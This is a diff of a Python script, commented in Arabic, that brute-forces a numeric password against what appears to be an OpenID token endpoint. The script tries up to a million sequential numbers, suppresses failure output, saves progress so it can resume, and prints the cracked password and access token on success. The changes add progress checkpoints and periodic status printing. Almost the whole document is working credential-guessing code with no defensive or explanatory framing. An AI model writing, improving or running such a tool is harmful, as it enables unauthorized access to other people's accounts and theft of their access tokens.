@@ -19,14 +19,16 @@ BASE_DATA = {
     "scope": "openid"
 }
 
-initial_password = 142800233
-MAX_ATTEMPTS = 1_000_000  # حد أقصى للحماية من التكرار اللانهائي
+initial_password = 142800533
+MAX_ATTEMPTS = 1_000_000
 
-# اسم ملف حفظ التقدم
 PROGRESS_FILE = "sh.txt"
 
+# عدد المحاولات بين كل عملية حفظ وطباعة تقدم
+SAVE_INTERVAL = 100
+PRINT_INTERVAL = 1000
+
 def load_progress():
-    """قراءة آخر رقم تم اختباره من الملف، وإرجاع None إذا لم يوجد."""
     if os.path.exists(PROGRESS_FILE):
         try:
             with open(PROGRESS_FILE, "r") as f:
@@ -36,12 +38,13 @@ def load_progress():
     return None
 
 def save_progress(value):
-    """حفظ الرقم الحالي (الذي تم اختباره) في الملف."""
+    """حفظ الرقم الحالي مع تفريغ فوري للبيانات على القرص."""
     with open(PROGRESS_FILE, "w") as f:
         f.write(str(value))
+        f.flush()          # تأكيد الكتابة الفورية
+        os.fsync(f.fileno())  # ضمان الكتابة الفعلية (اختياري)
 
 def get_access_token():
-    # استئناف من الرقم التالي للمحفوظ (إن وجد)
     saved = load_progress()
     if saved is not None:
         current_password = saved + 1
@@ -61,8 +64,7 @@ def get_access_token():
 
             if response.status_code == 200:
                 json_response = response.json()
-                # ✅ نجاح – نحفظ الرقم الناجح ثم نخرج
-                save_progress(current_password)
+                save_progress(current_password)  # حفظ الرقم الناجح
                 print("\n✅ تم الحصول على التوكن بنجاح!")
                 print(f"🔐 كلمة المرور الصحيحة: {current_password}")
                 print(f"📦 الرد الكامل: {json_response}")
@@ -70,22 +72,22 @@ def get_access_token():
                 print(f"⏳ ينتهي بعد: {json_response.get('expires_in')} ثانية")
                 return json_response
             else:
-                # فشل – لا نطبع شيئاً (صامت)
-                pass
+                pass  # فشل – لا نطبع شيئاً
 
         except RequestException:
-            # خطأ شبكة – لا نطبع شيئاً (صامت)
-            pass
+            pass  # خطأ شبكة – لا نطبع شيئاً
 
-        # حفظ التقدم بعد كل محاولة (الرقم الذي تم اختباره)
-        save_progress(current_password)
+        # حفظ التقدم كل 100 محاولة
+        if attempt % SAVE_INTERVAL == 0:
+            save_progress(current_password)
 
-        # زيادة الرقم للمحاولة التالية
+        # طباعة التقدم كل 1000 محاولة (للمتابعة)
+        if attempt % PRINT_INTERVAL == 0:
+            print(f"⏳ تمت {attempt} محاولة، آخر رقم تم اختباره: {current_password}")
+
         current_password += 1
-        # تأخير اختياري لتخفيف الضغط على الخادم
-        time.sleep(0.001)
+        time.sleep(0.001)  # تقليل الضغط على الخادم
 
-    # انتهت المحاولات دون نجاح
     print("❌ فشلت جميع المحاولات (وصلت للحد الأقصى).")
     return None
 
